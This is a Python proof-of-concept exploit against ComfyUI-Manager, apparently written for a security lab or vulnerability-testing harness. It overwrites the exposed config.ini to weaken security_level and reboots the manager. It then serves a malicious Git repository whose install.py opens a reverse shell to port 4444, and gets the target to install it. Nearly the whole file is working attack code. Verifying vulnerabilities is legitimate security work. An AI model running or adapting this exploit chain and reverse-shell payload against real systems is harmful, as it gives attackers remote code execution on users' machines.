#!/usr/bin/env python3
"""Install a custom node after changing ComfyUI-Manager's public config."""

import functools
import http.client
import http.server
import json
import os
from pathlib import Path
import re
import socket
import subprocess
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid


CONFIG_PATH = "/userdata/ComfyUI-Manager%2Fconfig.ini"


class QuietGitHandler(http.server.SimpleHTTPRequestHandler):
    """Serve a bare Git repository without request logs."""

    def log_message(self, format: str, *args: object) -> None:
        return


def request_response(
    url: str,
    data: bytes | None = None,
    headers: dict[str, str] | None = None,
) -> tuple[int, bytes]:
    request = urllib.request.Request(url, data=data, headers=headers or {})
    try:
        response = urllib.request.urlopen(request, timeout=45)
    except urllib.error.HTTPError as error:
        response = error
    with response:
        return response.status, response.read()


def assert_install_restricted(target: str) -> None:
    status, _ = request_response(
        f"{target}/customnode/install/git_url",
        b"http://invalid.example/comfyui-001-preflight",
        {"Content-Type": "text/plain"},
    )
    if status != 403:
        raise RuntimeError(f"fresh target did not restrict Git install: HTTP {status}")


def weaken_manager_config(target: str) -> None:
    status, content = request_response(f"{target}{CONFIG_PATH}")
    if status != 200:
        raise RuntimeError(f"manager config was not exposed: HTTP {status}")
    config = content.decode("utf-8")
    changed, count = re.subn(
        r"(?m)^(security_level\s*=\s*)\S+\s*$",
        r"\g<1>weak",
        config,
    )
    if count != 1:
        raise RuntimeError("manager config has no unique security_level setting")
    status, _ = request_response(
        f"{target}{CONFIG_PATH}",
        changed.encode(),
        {"Content-Type": "application/octet-stream"},
    )
    if status != 200:
        raise RuntimeError(f"manager config overwrite failed: HTTP {status}")


def reboot_manager(target: str) -> None:
    try:
        status, _ = request_response(f"{target}/manager/reboot")
        if status not in (200, 202):
            raise RuntimeError(f"manager reboot returned HTTP {status}")
    except (http.client.RemoteDisconnected, urllib.error.URLError,
            ConnectionResetError, TimeoutError):
        pass


def wait_for_manager(target: str) -> None:
    time.sleep(5)
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        try:
            status, _ = request_response(f"{target}/manager/preview_method")
            if status == 200:
                return
        except (http.client.RemoteDisconnected, urllib.error.URLError,
                ConnectionResetError, TimeoutError):
            pass
        time.sleep(2)
    raise RuntimeError("manager did not become ready after reboot")


def run_git(arguments: list[str], directory: Path) -> None:
    subprocess.run(
        ["git", *arguments],
        cwd=directory,
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def build_malicious_repo(directory: Path) -> str:
    source = directory / "source"
    source.mkdir()
    (source / "__init__.py").write_text("NODE_CLASS_MAPPINGS = {}\n")
    (source / "install.py").write_text(
        "import os\n"
        "import socket\n"
        "sock = socket.socket()\n"
        "sock.connect(('127.0.0.1', 4444))\n"
        "for descriptor in (0, 1, 2):\n"
        "    os.dup2(sock.fileno(), descriptor)\n"
        "os.execl('/bin/sh', 'sh', '-i')\n"
    )
    run_git(["init", "--quiet"], source)
    run_git(["add", "."], source)
    run_git([
        "-c", "user.name=dojo",
        "-c", "user.email=dojo@example.com",
        "commit", "--quiet", "-m", "custom node",
    ], source)
    name = f"comfyui-001-node-{uuid.uuid4().hex[:12]}"
    run_git(["clone", "--bare", "--quiet", str(source), name], directory)
    run_git(["update-server-info"], directory / name)
    return name


def attacker_host(target: str) -> str:
    override = os.environ.get("POC_GIT_HOST")
    if override:
        return override
    target_host = urllib.parse.urlsplit(target).hostname
    if not target_host:
        raise RuntimeError("target URL has no hostname")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
        probe.connect((target_host, 80))
        return probe.getsockname()[0]


def install_malicious_node(target: str) -> tuple[int, str]:
    with tempfile.TemporaryDirectory(prefix="comfyui-001-git-") as temp_dir:
        directory = Path(temp_dir)
        name = build_malicious_repo(directory)
        handler = functools.partial(QuietGitHandler, directory=temp_dir)
        port = int(os.environ.get("POC_GIT_BIND_PORT", "40001"))
        server = http.server.ThreadingHTTPServer(("127.0.0.1", port), handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        host = attacker_host(target)
        git_url = f"http://{host}:{server.server_port}/{name}"
        try:
            status, response = request_response(
                f"{target}/customnode/install/git_url",
                git_url.encode(),
                {"Content-Type": "text/plain"},
            )
        finally:
            server.shutdown()
            server.server_close()
            thread.join(timeout=5)
        if status != 200:
            raise RuntimeError(f"Git install returned HTTP {status}: {response[:300]!r}")
        return status, git_url


def main() -> None:
    target = os.environ["REMOTE_TARGET_URL"].rstrip("/")
    assert_install_restricted(target)
    weaken_manager_config(target)
    reboot_manager(target)
    wait_for_manager(target)
    status, git_url = install_malicious_node(target)
    print(json.dumps({
        "evidence_payload": {
            "config_path": "ComfyUI-Manager/config.ini",
            "git_url": git_url,
            "install_http_status": status,
        },
    }))


if __name__ == "__main__":
    main()
